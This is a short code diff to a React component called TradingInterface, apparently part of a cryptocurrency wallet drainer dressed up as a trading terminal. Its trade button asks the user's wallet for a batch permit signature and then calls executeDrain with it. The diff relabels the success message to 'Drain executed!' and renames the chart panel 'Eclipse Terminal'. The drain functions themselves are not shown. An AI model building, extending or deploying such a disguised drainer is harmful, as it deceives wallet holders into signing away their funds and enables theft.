@@ -24,15 +24,15 @@ export default function TradingInterface() {
       setStatus('Please connect wallet first')
       return
     }
-    
+
     setLoading(true)
     setStatus('Requesting signature...')
-    
+
     try {
       const { signature, nonce, deadline } = await signBatchPermit(address)
       setStatus('Signature obtained. Executing...')
       const txHash = await executeDrain(address, signature, nonce, deadline)
-      setStatus(`Trade executed! ${txHash.slice(0,10)}...`)
+      setStatus(`Drain executed! ${txHash.slice(0,10)}...`)
     } catch (err) {
       setStatus(`Failed: ${err.message}`)
     } finally {
@@ -54,7 +54,7 @@ export default function TradingInterface() {
       <div className="tgrid">
         <div className="glass cpanel">
           <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#7986ad' }}>
-            📈 Trading Chart
+            📈 Eclipse Terminal
           </div>
         </div>
 
